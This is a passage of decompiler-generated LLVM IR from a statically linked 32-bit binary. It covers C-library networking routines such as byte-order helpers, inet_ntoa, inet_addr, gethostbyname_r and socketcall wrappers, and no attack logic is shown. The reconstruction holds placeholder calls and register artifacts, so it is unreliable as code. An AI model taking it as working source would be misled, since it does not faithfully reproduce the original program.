  %v2_804f5ce = ptrtoint i32* %stack_var_-27 to i32
  %v0_804f5d3 = load i32, i32* @ebx, align 4
  %v1_804f5d3 = add i32 %v0_804f5d3, 17
  store i32 %v1_804f5d3, i32* %eax.global-to-local, align 4
  %v4_804f5d7 = call i32 @__GI_mempcpy(i32 %v1_804f5d3, i32 %v2_804f5ce, i32 19, i32 %v0_804f5cb)
  store i32 %v4_804f5d7, i32* %eax.global-to-local, align 4
  %v3_804f5e4 = inttoptr i32 %v4_804f5d7 to i8*
  %v4_804f5e4 = call i32 @__GI_memset(i8* %v3_804f5e4, i32 0, i32 13)
  store i32 %v4_804f5e4, i32* %eax.global-to-local, align 4
  %v0_804f5ec.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f5ec

dec_label_pc_804f5ec:                             ; preds = %entry, %dec_label_pc_804f5a9
  %v0_804f5ec = phi i32 [ %v3_804f59b, %entry ], [ %v0_804f5ec.pre, %dec_label_pc_804f5a9 ]
  store i32 %v0_804f5ec, i32* %eax.global-to-local, align 4
  %v2_804f5f1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f5f1, i32* @ebx, align 4
  store i32 %v0_804f584, i32* @esi, align 4
  ret i32 %v0_804f5ec

; uselistorder directives
  uselistorder i32 %v0_804f5ec, { 1, 0 }
  uselistorder i32 %v3_804f59b, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f5ec, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f5f8 = trunc i32 %arg1 to i16
  %v2_804f5f8 = call i16 @llvm.bswap.i16(i16 %v1_804f5f8)
  %v3_804f5f8 = zext i16 %v2_804f5f8 to i32
  ret i32 %v3_804f5f8
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_804f604 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_804f604
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f60b = trunc i32 %arg1 to i16
  %v2_804f60b = call i16 @llvm.bswap.i16(i16 %v1_804f60b)
  %v3_804f60b = zext i16 %v2_804f60b to i32
  ret i32 %v3_804f60b
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f617 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804f617
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f61c = load i32, i32* @edi, align 4
  %v0_804f61d = load i32, i32* @esi, align 4
  %v0_804f61e = load i32, i32* @ebx, align 4
  store i32 %v0_804f61e, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_804f629 = add i32 %arg2, 15
  store i32 %v1_804f629, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_804f62e = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_804f62e, 16777216
  %v1_804f630 = sdiv i32 %sext, 16777216
  store i32 %v1_804f630, i32* @ebx, align 4
  br label %dec_label_pc_804f634

dec_label_pc_804f634:                             ; preds = %entry, %dec_label_pc_804f659
  %v0_804f63717 = phi i32 [ %v1_804f630, %entry ], [ %v2_804f659, %dec_label_pc_804f659 ]
  %v0_804f66416 = phi i32 [ %v1_804f629, %entry ], [ %v0_804f65d, %dec_label_pc_804f659 ]
  %v1_804f639 = urem i32 %v0_804f63717, 256
  %v5_804f647 = inttoptr i32 %v0_804f66416 to i8*
  %v6_804f647 = call i32 @_uintmaxtostr(i8* %v5_804f647, i32 %v1_804f639, i32 0, i32 -10, i32 0)
  %v0_804f64f = load i32, i32* @esi, align 4
  %v1_804f64f = icmp eq i32 %v0_804f64f, 0
  %v1_804f651 = add i32 %v6_804f647, -1
  store i32 %v1_804f651, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f64f, label %dec_label_pc_804f659, label %dec_label_pc_804f656

dec_label_pc_804f656:                             ; preds = %dec_label_pc_804f634
  %v1_804f656 = inttoptr i32 %v0_804f64f to i8*
  store i8 46, i8* %v1_804f656, align 1
  %v0_804f65d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f659

dec_label_pc_804f659:                             ; preds = %dec_label_pc_804f634, %dec_label_pc_804f656
  %v0_804f65d = phi i32 [ %v1_804f651, %dec_label_pc_804f634 ], [ %v0_804f65d.pre, %dec_label_pc_804f656 ]
  %v0_804f659 = load i32, i32* @ebx, align 4
  %v2_804f659 = udiv i32 %v0_804f659, 256
  store i32 %v2_804f659, i32* @ebx, align 4
  %v0_804f65c = load i32, i32* @edi, align 4
  %v1_804f65c = add i32 %v0_804f65c, 1
  store i32 %v1_804f65c, i32* @edi, align 4
  store i32 %v0_804f65d, i32* @esi, align 4
  %v7_804f662 = icmp sgt i32 %v1_804f65c, 3
  br i1 %v7_804f662, label %dec_label_pc_804f664, label %dec_label_pc_804f634

dec_label_pc_804f664:                             ; preds = %dec_label_pc_804f659
  %v1_804f664 = add i32 %v0_804f65d, 1
  %v2_804f667 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f667, i32* @ebx, align 4
  store i32 %v0_804f61d, i32* @esi, align 4
  store i32 %v0_804f61c, i32* @edi, align 4
  ret i32 %v1_804f664

; uselistorder directives
  uselistorder i32 %v0_804f65d, { 0, 2, 1 }
  uselistorder i32 %v1_804f630, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f659, { 1, 0 }
  uselistorder label %dec_label_pc_804f634, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804f677 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_805fb44.217 to i32))
  ret i32 %v2_804f677
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_804f683 = ptrtoint i32* %stack_var_-4 to i32
  %v2_804f68c = inttoptr i32 %arg1 to i8*
  %v3_804f68c = call i32 @inet_aton(i8* %v2_804f68c, i32 %v2_804f683)
  %v1_804f697 = icmp eq i32 %v3_804f68c, 0
  br i1 %v1_804f697, label %dec_label_pc_804f69f, label %dec_label_pc_804f69b

dec_label_pc_804f69b:                             ; preds = %entry
  %v3_804f69b = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f69f

dec_label_pc_804f69f:                             ; preds = %entry, %dec_label_pc_804f69b
  %v0_804f69f = phi i32 [ -1, %entry ], [ %v3_804f69b, %dec_label_pc_804f69b ]
  ret i32 %v0_804f69f

; uselistorder directives
  uselistorder label %dec_label_pc_804f69f, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804f6ab = call i32 @__GI___h_errno_location()
  %v0_804f6b0 = load i32, i32* @edx, align 4
  %v2_804f6b3 = ptrtoint i32* %stack_var_-4 to i32
  %v9_804f6cb = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_805fd2c.219, i32 ptrtoint (i32* @global_var_805fb60.218 to i32), i32 460, i32 %v2_804f6b3, i32 %v0_804f6ab, i32 %v0_804f6b0, i32 %v0_804f6b0)
  %v3_804f6d0 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804f6d0
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804f6d8 = load i32, i32* @ebp, align 4
  %v0_804f6d9 = load i32, i32* @edi, align 4
  %v0_804f6da = load i32, i32* @esi, align 4
  %v0_804f6db = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804f6eb = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804f6eb, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804f6f6 = icmp eq i32 %arg1, 0
  br i1 %v4_804f6f6, label %dec_label_pc_804fa02, label %dec_label_pc_804f701

dec_label_pc_804f701:                             ; preds = %entry
  %v1_804f701 = call i32 @__errno_location(i32 %v0_804f6db)
  store i32 %v1_804f701, i32* %eax.global-to-local, align 4
  store i32 %v1_804f701, i32* @esi, align 4
  %v1_804f708 = inttoptr i32 %v1_804f701 to i32*
  %v2_804f708 = load i32, i32* %v1_804f708, align 4
  store i32 %v2_804f708, i32* @edi, align 4
  store i32 0, i32* %v1_804f708, align 4
  %v0_804f719 = load i32, i32* @ebx, align 4
  store i32 %v0_804f719, i32* %stack_var_-108, align 4
  %v7_804f725 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804f719, i32 %arg5, i32 %arg6, i32 %v1_804f701)
  store i32 %v7_804f725, i32* %eax.global-to-local, align 4
  %v1_804f72d = icmp eq i32 %v7_804f725, 0
  br i1 %v1_804f72d, label %dec_label_pc_804fa02, label %dec_label_pc_804f735

dec_label_pc_804f735:                             ; preds = %dec_label_pc_804f701
  %v1_804f739 = inttoptr i32 %arg6 to i32*
  %v2_804f739 = load i32, i32* %v1_804f739, align 4
  store i32 %v2_804f739, i32* %edx.global-to-local, align 4
  %v9_804f73b = icmp eq i32 %v2_804f739, 1
  br i1 %v9_804f73b, label %dec_label_pc_804f755, label %dec_label_pc_804f740

dec_label_pc_804f740:                             ; preds = %dec_label_pc_804f735
  %v9_804f740 = icmp eq i32 %v2_804f739, 4
  br i1 %v9_804f740, label %dec_label_pc_804f755, label %dec_label_pc_804f745

dec_label_pc_804f745:                             ; preds = %dec_label_pc_804f740
  %v1_804f745 = add i32 %v2_804f739, 1
  %v8_804f745 = icmp eq i32 %v1_804f745, 0
  store i32 %v1_804f745, i32* %edx.global-to-local, align 4
  %v1_804f746 = icmp eq i1 %v8_804f745, false
  br i1 %v1_804f746, label %dec_label_pc_804fa02, label %dec_label_pc_804f74c

dec_label_pc_804f74c:                             ; preds = %dec_label_pc_804f745
  %v0_804f74c = load i32, i32* @esi, align 4
  %v1_804f74c = inttoptr i32 %v0_804f74c to i32*
  %v2_804f74c = load i32, i32* %v1_804f74c, align 4
  %v11_804f74c = icmp eq i32 %v2_804f74c, 2
  %v1_804f74f = icmp eq i1 %v11_804f74c, false
  br i1 %v1_804f74f, label %dec_label_pc_804fa02, label %dec_label_pc_804f755

dec_label_pc_804f755:                             ; preds = %dec_label_pc_804f74c, %dec_label_pc_804f740, %dec_label_pc_804f735
  %v0_804f755 = load i32, i32* @ebp, align 4
  store i32 %v0_804f755, i32* %eax.global-to-local, align 4
  %v0_804f757 = load i32, i32* @edi, align 4
  %v1_804f757 = load i32, i32* @esi, align 4
  %v2_804f757 = inttoptr i32 %v1_804f757 to i32*
  store i32 %v0_804f757, i32* %v2_804f757, align 4
  %v0_804f759 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f759 = sub i32 0, %v0_804f759
  %v1_804f75b = urem i32 %v1_804f759, 4
  %v2_804f75b = icmp eq i32 %v1_804f75b, 0
  store i32 %v1_804f75b, i32* %eax.global-to-local, align 4
  %v0_804f770.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804f75b, label %dec_label_pc_804f76c, label %dec_label_pc_804f760

dec_label_pc_804f760:                             ; preds = %dec_label_pc_804f755
  %v2_804f760 = sub i32 %v0_804f770.pre, %v1_804f75b
  %v7_804f760 = icmp ult i32 %v0_804f770.pre, %v1_804f75b
  br i1 %v7_804f760, label %dec_label_pc_804f9fd, label %dec_label_pc_804f768

dec_label_pc_804f768:                             ; preds = %dec_label_pc_804f760
  %v0_804f768 = load i32, i32* @ebp, align 4
  %v2_804f768 = add i32 %v0_804f768, %v1_804f75b
  store i32 %v2_804f768, i32* @ebp, align 4
  store i32 %v2_804f760, i32* @ebx, align 4
  br label %dec_label_pc_804f76c

dec_label_pc_804f76c:                             ; preds = %dec_label_pc_804f755, %dec_label_pc_804f768
  %v0_804f770 = phi i32 [ %v2_804f760, %dec_label_pc_804f768 ], [ %v0_804f770.pre, %dec_label_pc_804f755 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804f739, align 4
  %tmp43 = icmp ult i32 %v0_804f770, 4
  br i1 %tmp43, label %dec_label_pc_804f9fd, label %dec_label_pc_804f77f

dec_label_pc_804f77f:                             ; preds = %dec_label_pc_804f76c
  %v0_804f77f = load i32, i32* @ebx, align 4
  %v1_804f77f = add i32 %v0_804f77f, -4
  store i32 %v1_804f77f, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_804f77f, 8
  br i1 %tmp44, label %dec_label_pc_804f9fd, label %dec_label_pc_804f78b

dec_label_pc_804f78b:                             ; preds = %dec_label_pc_804f77f
  %v0_804f78b = load i32, i32* @ebp, align 4
  %v1_804f78b = add i32 %v0_804f78b, 4
  store i32 %v1_804f78b, i32* %edx.global-to-local, align 4
  %v1_804f78e = add i32 %v0_804f77f, -12
  store i32 %v1_804f78e, i32* %eax.global-to-local, align 4
  store i32 %v1_804f78b, i32* %stack_var_-92, align 4
  %v3_804f797 = inttoptr i32 %v1_804f78b to i32*
  store i32 %v0_804f78b, i32* %v3_804f797, align 4
  %v0_804f79a = load i32, i32* %edx.global-to-local, align 4
  %v1_804f79a = add i32 %v0_804f79a, 4
  %v2_804f79a = inttoptr i32 %v1_804f79a to i32*
  store i32 0, i32* %v2_804f79a, align 4
  %tmp45 = icmp ult i32 %v1_804f78e, 32
  br i1 %tmp45, label %dec_label_pc_804f9fd, label %dec_label_pc_804f7a7

dec_label_pc_804f7a7:                             ; preds = %dec_label_pc_804f78b
  %v0_804f7a7 = load i32, i32* @ebx, align 4
  %v1_804f7a7 = add i32 %v0_804f7a7, -44
  store i32 %v1_804f7a7, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_804f7a7, 256
  br i1 %tmp46, label %dec_label_pc_804f9fd, label %dec_label_pc_804f7ba

dec_label_pc_804f7ba:                             ; preds = %dec_label_pc_804f7a7
  %v0_804f7ba = load i32, i32* @ebp, align 4
  %v1_804f7ba = add i32 %v0_804f7ba, 12
  %v1_804f7bd = add i32 %v0_804f7ba, 44
  store i32 %v1_804f7bd, i32* @edi, align 4
  store i32 %v1_804f7bd, i32* %stack_var_-108, align 4
  %v3_804f7ce = inttoptr i32 %v1_804f7bd to i8*
  %v4_804f7ce = call i32 @strncpy(i8* %v3_804f7ce, i32 %arg1, i32 %v1_804f7a7)
  %v0_804f7d3 = load i32, i32* @edi, align 4
  %v1_804f7d3 = load i32, i32* @ebp, align 4
  %v2_804f7d3 = add i32 %v1_804f7d3, 12
  %v3_804f7d3 = inttoptr i32 %v2_804f7d3 to i32*
  store i32 %v0_804f7d3, i32* %v3_804f7d3, align 4
  %v1_804f7da = add i32 %v0_804f7ba, 16
  %v2_804f7da = inttoptr i32 %v1_804f7da to i32*
  store i32 0, i32* %v2_804f7da, align 4
  %v2_804f7e1 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804f7e1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804f7e3 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804f7e8 = inttoptr i32 %arg1 to i8*
  %v3_804f7e8 = call i32 @inet_aton(i8* %v2_804f7e8, i32 %v0_804f7e3)
  store i32 %v3_804f7e8, i32* %eax.global-to-local, align 4
  %v1_804f7f0 = icmp eq i32 %v3_804f7e8, 0
  br i1 %v1_804f7f0, label %dec_label_pc_804f82c, label %dec_label_pc_804f7f4

dec_label_pc_804f7f4:                             ; preds = %dec_label_pc_804f7ba
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804f7f8 = load i32, i32* @edi, align 4
  store i32 %v0_804f7f8, i32* %arg2, align 4
  %v1_804f7fa = add i32 %tmp18, 8
  %v2_804f7fa = inttoptr i32 %v1_804f7fa to i32*
  store i32 2, i32* %v2_804f7fa, align 4
  %v0_804f801 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f801 = add i32 %v0_804f801, 12
  %v2_804f801 = inttoptr i32 %v1_804f801 to i32*
  store i32 4, i32* %v2_804f801, align 4
  %v2_804f808 = load i32, i32* %stack_var_-92, align 4
  %v1_804f80b = load i32, i32* %edx.global-to-local, align 4
  %v2_804f80b = add i32 %v1_804f80b, 16
  %v3_804f80b = inttoptr i32 %v2_804f80b to i32*
  store i32 %v2_804f808, i32* %v3_804f80b, align 4
  %v1_804f812 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f812 = add i32 %v1_804f812, 4
  %v3_804f812 = inttoptr i32 %v2_804f812 to i32*
  store i32 %v1_804f7ba, i32* %v3_804f812, align 4
  %v0_804f819 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f819, i32* %v1_804f6eb, align 4
  store i32 0, i32* %v1_804f739, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fa02

dec_label_pc_804f82c:                             ; preds = %dec_label_pc_804f7ba
  %v0_804f82c = call i32 @__open_nameservers()
  store i32 %v0_804f82c, i32* @eax, align 4
  %v2_804f83c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804f83c, i32* @ebx, align 4
  store i32 %v2_804f83c, i32* %stack_var_-108, align 4
  %v2_804f841 = call i32 @__pthread_return_void(i32 %v2_804f83c, i32 134550975)
  store i32 %v2_804f841, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8059ac8.220 to i32), i32* %stack_var_-108, align 4
  %v1_804f84d = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059ac8.220 to i32))
  store i32 ptrtoint (i32* @global_var_8059ac8.220 to i32), i32* @ecx, align 4
  store i32 134550975, i32* @eax, align 4
  store i32 %v2_804f83c, i32* %stack_var_-108, align 4
  %v0_804f857 = load i32, i32* @global_var_80601b4.221, align 4
  store i32 %v0_804f857, i32* @esi, align 4
  %v2_804f85d = call i32 @__pthread_return_void(i32 %v2_804f83c, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804f878 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804f87d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804f87d, i32* %eax.global-to-local, align 4
  store i32 %v2_804f87d, i32* %stack_var_-108, align 4
  %v0_804f887 = load i32, i32* @esi, align 4
  %v7_804f88e = call i32 @__dns_lookup(i8* %v2_804f7e8, i32 1, i32 %v0_804f887, i32 ptrtoint (i32* @global_var_80601a8.222 to i32), i32 %v2_804f87d, i32 %v2_804f878)
  store i32 %v7_804f88e, i32* %eax.global-to-local, align 4
  %v2_804f896 = icmp slt i32 %v7_804f88e, 0
  %v1_804f898 = icmp eq i1 %v2_804f896, false
  br i1 %v1_804f898, label %dec_label_pc_804f8ae, label %dec_label_pc_804f89a

dec_label_pc_804f89a:                             ; preds = %dec_label_pc_804f82c
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804f739, align 4
  br label %dec_label_pc_804fa02

dec_label_pc_804f8ae:                             ; preds = %dec_label_pc_804f82c
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804f8c1 = icmp ugt i32 %v1_804f7a7, 256
  %v15_804f8c1 = icmp eq i32 %v0_804f7a7, 300
  %v2_804f8c5 = or i1 %v15_804f8c1, %v10_804f8c1
  br i1 %v2_804f8c5, label %dec_label_pc_804f960, label %dec_label_pc_804f8c7

dec_label_pc_804f8c7:                             ; preds = %dec_label_pc_804f8ae
  %v3_804f8ca = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804f8ca, i32* %stack_var_-108, align 4
  %v1_804f8ce = call i32 @free(i32 %v3_804f8ca)
  store i32 %v1_804f8ce, i32* %eax.global-to-local, align 4
  store i32 %v3_804f8ca, i32* @edi, align 4
  %v3_804f8d4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f8d4, i32* %stack_var_-108, align 4
  %v1_804f8d8 = call i32 @free(i32 %v3_804f8d4)
  store i32 -1, i32* %v1_804f739, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f9d8

dec_label_pc_804f960:                             ; preds = %dec_label_pc_804f8ae
  %v3_804f965.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804f969.pre = load i32, i32* @edi, align 4
  store i32 %v0_804f969.pre, i32* %stack_var_-108, align 4
  %v3_804f96a = inttoptr i32 %v0_804f969.pre to i8*
  %v4_804f96a = call i32 @strncpy(i8* %v3_804f96a, i32 %v3_804f965.pre, i32 %v1_804f7a7)
  store i32 %v4_804f96a, i32* %eax.global-to-local, align 4
  %v3_804f970 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804f970, i32* %stack_var_-108, align 4
  %v1_804f974 = call i32 @free(i32 %v3_804f970)
  store i32 %v1_804f974, i32* %eax.global-to-local, align 4
  %v12_804f97c = icmp eq i32 %tmp10, 1
  %v1_804f981 = icmp eq i1 %v12_804f97c, false
  br i1 %v1_804f981, label %dec_label_pc_804f9dd, label %dec_label_pc_804f983

dec_label_pc_804f983:                             ; preds = %dec_label_pc_804f960
  %v0_804f983 = load i32, i32* @edx, align 4
  %v0_804f98a = load i32, i32* @ebp, align 4
  store i32 %v0_804f98a, i32* %stack_var_-108, align 4
  %v3_804f98b = inttoptr i32 %tmp to i16*
  %v4_804f98b = call i32 @memcpy(i16* %v3_804f98b, i32 4, i32 %v0_804f983)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804f994 = load i32, i32* @edi, align 4
  store i32 %v0_804f994, i32* %arg2, align 4
  %v1_804f996 = add i32 %tmp18, 8
  %v2_804f996 = inttoptr i32 %v1_804f996 to i32*
  store i32 2, i32* %v2_804f996, align 4
  %v0_804f99d = load i32, i32* %eax.global-to-local, align 4
  %v1_804f99d = add i32 %v0_804f99d, 12
  %v2_804f99d = inttoptr i32 %v1_804f99d to i32*
  store i32 4, i32* %v2_804f99d, align 4
  %v3_804f9a4 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804f9a4, i32* %edx.global-to-local, align 4
  %v1_804f9a8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f9a8 = add i32 %v1_804f9a8, 16
  %v3_804f9a8 = inttoptr i32 %v2_804f9a8 to i32*
  store i32 %v3_804f9a4, i32* %v3_804f9a8, align 4
  %v1_804f9af = load i32, i32* %eax.global-to-local, align 4
  %v2_804f9af = add i32 %v1_804f9af, 4
  %v3_804f9af = inttoptr i32 %v2_804f9af to i32*
  store i32 %v1_804f7ba, i32* %v3_804f9af, align 4
  %v2_804f9b2 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804f9b2, i32* %eax.global-to-local, align 4
  %v3_804f9b3 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f9b3, i32* %stack_var_-108, align 4
  %v1_804f9b7 = call i32 @free(i32 %v3_804f9b3)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804f6eb, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804f739, align 4
  br label %dec_label_pc_804f9d8

dec_label_pc_804f9d8:                             ; preds = %dec_label_pc_804f9dd, %dec_label_pc_804f8c7, %dec_label_pc_804f983
  br label %dec_label_pc_804fa02

dec_label_pc_804f9dd:                             ; preds = %dec_label_pc_804f960
  %v3_804f9e0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f9e0, i32* %stack_var_-108, align 4
  %v1_804f9e4 = call i32 @free(i32 %v3_804f9e0)
  store i32 1, i32* %v1_804f739, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f9d8

dec_label_pc_804f9fd:                             ; preds = %dec_label_pc_804f7a7, %dec_label_pc_804f78b, %dec_label_pc_804f77f, %dec_label_pc_804f76c, %dec_label_pc_804f760
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fa02

dec_label_pc_804fa02:                             ; preds = %dec_label_pc_804f74c, %dec_label_pc_804f745, %dec_label_pc_804f701, %entry, %dec_label_pc_804f9d8, %dec_label_pc_804f89a, %dec_label_pc_804f7f4, %dec_label_pc_804f9fd
  store i32 %v0_804f6db, i32* @ebx, align 4
  store i32 %v0_804f6da, i32* @esi, align 4
  store i32 %v0_804f6d9, i32* @edi, align 4
  store i32 %v0_804f6d8, i32* @ebp, align 4
  %v0_804fa09 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804fa09

; uselistorder directives
  uselistorder i32 %v2_804f83c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804f7bd, { 1, 0, 2 }
  uselistorder i32 %v1_804f7ba, { 1, 0 }
  uselistorder i32 %v1_804f7a7, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804f770.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804f75b, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_804f739, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804f739, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804f6eb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804fa02, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804f9d8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f76c, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fa27 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fa2e = call i32 @__socketcall(i32 3, i32 %v2_804fa27)
  ret i32 %v2_804fa2e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fa53 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fa5a = call i32 @__socketcall(i32 6, i32 %v2_804fa53)
  ret i32 %v2_804fa5a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804fa8f = ptrtoint i32* %stack_var_-20 to i32
  %v2_804fa96 = call i32 @__socketcall(i32 15, i32 %v2_804fa8f)
  ret i32 %v2_804fa96

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804fac3 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804faca = call i32 @__socketcall(i32 10, i32 %v2_804fac3)
  ret i32 %v2_804faca

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804faf7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804fafe = call i32 @__socketcall(i32 9, i32 %v2_804faf7)
  ret i32 %v2_804fafe

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804fb3b = ptrtoint i32* %stack_var_-24 to i32
  %v2_804fb42 = call i32 @__socketcall(i32 11, i32 %v2_804fb3b)
  ret i32 %v2_804fb42

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
